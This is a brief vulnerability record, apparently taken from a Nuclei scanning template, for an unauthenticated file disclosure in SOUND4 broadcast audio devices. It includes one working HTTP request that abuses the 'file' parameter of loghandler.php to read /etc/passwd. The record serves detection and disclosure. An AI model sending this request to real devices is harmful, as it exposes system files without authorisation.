# Vulnerability: SOUND4 IMPACT/FIRST/PULSE/Eco <=2.x (PHPTail) Unauthenticated File Disclosure
**Classification:** PACKETSTORM
**Source:** Nuclei Template (`sound4-file-disclosure.yaml`)

## Description
The application suffers from an unauthenticated file disclosure vulnerability. Using the 'file' GET parameter attackers can disclose arbitrary files on the affected device and disclose sensitive and system information.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/cgi-bin/loghandler.php?ajax=251&file=/mnt/old-root/etc/passwd
```

